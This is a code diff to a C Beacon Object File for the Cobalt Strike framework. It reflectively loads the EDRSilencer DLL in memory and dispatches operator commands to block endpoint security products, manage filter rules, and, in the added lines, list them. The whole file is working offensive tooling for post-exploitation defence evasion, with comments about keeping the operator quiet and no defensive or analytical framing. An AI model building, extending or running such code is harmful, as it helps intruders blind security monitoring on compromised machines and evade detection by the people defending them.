@@ -1,9 +1,17 @@
 #include "ReflectiveLoader.h"
 #include "beacon.h"
 
+/*
+ * bof_loader.c
+ * -------------
+ * Beacon Object File (BOF) entrypoint that reflectively loads the EDRSilencer DLL from bytes
+ * provided by the Aggressor script, resolves exports, and dispatches based on a simple command
+ * string. All calls run in quiet mode to minimize operator noise unless otherwise noted.
+ */
+
 int MSVCRT$strcmp(const char * s1, const char * s2);
 
-// Define function pointers for ALL of your DLL's exports
+// Define function pointers for DLL exports we call from Beacon
 typedef ULONG_PTR (WINAPI * Ldr)(LPVOID);
 typedef void (*Initialize_t)(void);
 typedef void (*SetMode_t)(BOOL);
@@ -11,10 +19,20 @@ typedef void (*BlockEDR_t)(BOOL);
 typedef void (*AddRuleByPath_t)(BOOL, const char*);
 typedef void (*RemoveAllRules_t)(BOOL);
 typedef void (*RemoveRuleByID_t)(BOOL, const char*);
+typedef void (*ListRules_t)(BOOL);
 
 #pragma GCC diagnostic push
 #pragma GCC diagnostic ignored "-Wcast-function-type"
 
+/*
+ * go
+ * --
+ * BOF entrypoint. Parses the DLL bytes and a command name from Aggressor, uses the
+ * reflective loader to map the DLL, and invokes the corresponding exported function.
+ *
+ * Expected args layout (Aggressor side):
+ *   [bytes dll] [string command] [optional params ...]
+ */
 void go(char *args, int len) {
     datap parser;
     char* dll_bytes;
@@ -27,7 +45,7 @@ void go(char *args, int len) {
     command = BeaconDataExtract(&parser, NULL); // Get the command name (e.g., "block")
 
     // 2. Use the real Reflective Loader to load the DLL from memory
-    // The ReflectiveLoader function is defined in ReflectiveLoader.c
+    //    The ReflectiveLoader function is defined in ReflectiveLoader.c
     Ldr pReflectiveLoader = (Ldr)ReflectiveLoader;
     HMODULE hDll = (HMODULE)pReflectiveLoader(dll_bytes);
 
@@ -36,7 +54,7 @@ void go(char *args, int len) {
         return;
     }
 
-    // 3. Find the address of the function we want to call based on the command
+    // 3. Resolve and call the requested export by command string
     if (MSVCRT$strcmp(command, "init") == 0) {
         Initialize_t pInitialize = (Initialize_t)GetProcAddress(hDll, "Initialize");
         if (pInitialize) {
@@ -92,6 +110,15 @@ void go(char *args, int len) {
             pRemoveID(TRUE, id);
         } else {
             BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: RemoveRuleByID");
+        }
+    }
+    else if (MSVCRT$strcmp(command, "list") == 0) {
+        ListRules_t pList = (ListRules_t)GetProcAddress(hDll, "ListRules");
+        if (pList) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[+] Calling ListRules(TRUE)...");
+            pList(TRUE);
+        } else {
+            BeaconPrintf(CALLBACK_ERROR, "Could not find exported function: ListRules");
         }
     }
     else {
